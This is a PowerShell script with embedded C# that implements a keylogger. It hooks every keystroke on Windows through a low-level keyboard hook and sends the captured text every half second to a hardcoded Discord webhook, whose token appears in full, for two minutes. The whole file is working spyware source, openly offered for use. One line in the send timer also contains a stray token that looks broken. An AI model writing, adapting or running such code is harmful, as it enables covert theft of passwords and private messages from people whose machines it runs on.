# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (robuster für deutsches Layout)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;

public class KeyLogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_KEYUP = 0x0101;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int WM_SYSKEYUP = 0x0105;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static LowLevelKeyboardProc _proc;
    private IntPtr _hookID = IntPtr.Zero;
    private StringBuilder _buffer = new StringBuilder();
    private DateTime _lastSend = DateTime.Now;
    private string _hookUrl;

    public KeyLogger(string hookUrl)
    {
        _hookUrl = hookUrl;
        _proc = HookCallback;
        _hookID = SetHook(_proc);
    }

    private IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
        {
            int vkCode = Marshal.ReadInt32(lParam);
                        uint scanCode = (uint)Marshal.ReadInt32(lParam, 4);

            byte[] keyState = new byte[256];
            GetKeyboardState(keyState);

            StringBuilder sb = new StringBuilder(10);
            IntPtr hkl = GetKeyboardLayout(0);
            int result = ToUnicodeEx((uint)vkCode, scanCode, keyState, sb, sb.Capacity, 0, hkl);

            if (result > 0)
            {
                _buffer.Append(sb.ToString());
            }
            else if (result == 0)
            {
                // Für nicht-zeichenbasierte Keys, füge eine Beschreibung hinzu
                switch (vkCode)
                {
                    case 0x08: _buffer.Append("[BACKSPACE]"); break;
                    case 0x09: _buffer.Append("[TAB]"); break;
                    case 0x0D: _buffer.Append("[ENTER]"); break;
                    case 0x1B: _buffer.Append("[ESC]"); break;
                    case 0x20: _buffer.Append(" "); break; // Leerzeichen
                    case 0x25: _buffer.Append("[LEFT]"); break;
                    case 0x26: _buffer.Append("[UP]"); break;
                    case 0x27: _buffer.Append("[RIGHT]"); break;
                    case 0x28: _buffer.Append("[DOWN]"); break;
                    case 0x2D: _buffer.Append("[INSERT]"); break;
                    case 0x2E: _buffer.Append("[DELETE]"); break;
                    case 0x70: _buffer.Append("[F1]"); break;
                    case 0x71: _buffer.Append("[F2]"); break;
                    case 0x72: _buffer.Append("[F3]"); break;
                    case 0x73: _buffer.Append("[F4]"); break;
                    case 0x74: _buffer.Append("[F5]"); break;
                    case 0x75: _buffer.Append("[F6]"); break;
                    case 0x76: _buffer.Append("[F7]"); break;
                    case 0x77: _buffer.Append("[F8]"); break;
                    case 0x78: _buffer.Append("[F9]"); break;
                    case 0x79: _buffer.Append("[F10]"); break;
                    case 0x7A: _buffer.Append("[F11]"); break;
                    case 0x7B: _buffer.Append("[F12]"); break;
                    default: _buffer.Append($"[VK:{vkCode}]"); break;
                }
            }
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    public void SendBuffer()
    {
        if (_buffer.Length > 0)
        {
            try
            {
                using (var client = new System.Net.WebClient())
                {
                    client.Headers.Add("Content-Type", "application/json");
                    string payload = $"{{\"content\":\"{_buffer.ToString().Replace("\"", "\\\"")}\"}}";
                    client.UploadString(_hookUrl, "POST", payload);
                }
                _buffer.Clear();
                _lastSend = DateTime.Now;
            }
                        catch (Exception ex) { Console.WriteLine("SendBuffer Exception: " + ex.ToString()); }
        }
    }

    public void Unhook()
    {
        UnhookWindowsHookEx(_hookID);
    }
}
"@

$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Logger-Start an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}

$logger = New-Object KeyLogger $hookUrl
$start = Get-Date
$timeout = 120 # Sekunden

# Lock-Objekt für SendBuffer-Synchronisierung
$sendBufferLock = New-Object Object

# Timer für regelmäßiges Senden (alle 500ms)
$sendTimer = New-Object System.Timers.Timer
$sendTimer.Interval = 500
$sendTimer.AutoReset = $true
$sendTimer.add_Elapsed({
    lock    [System.Threading.Monitor]::Enter($sendBufferLock)
    try {
        $logger.SendBuffer()
    } finally {
        [System.Threading.Monitor]::Exit($sendBufferLock)
    }
})
$sendTimer.Start()

# Timer für Timeout (120 Sekunden)
$timeoutTimer = New-Object System.Timers.Timer
$timeoutTimer.Interval = $timeout * 1000
$timeoutTimer.AutoReset = $false
$timeoutTimer.add_Elapsed({
    [System.Windows.Forms.Application]::Exit()
})
$timeoutTimer.Start()

# Message-Loop für Hook
[System.Windows.Forms.Application]::Run()

# Nach Timeout stoppen
$sendTimer.Stop()
$timeoutTimer.Stop()
$logger.SendBuffer()  # Rest senden
$logger.Unhook()

# Logger-Ende an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}
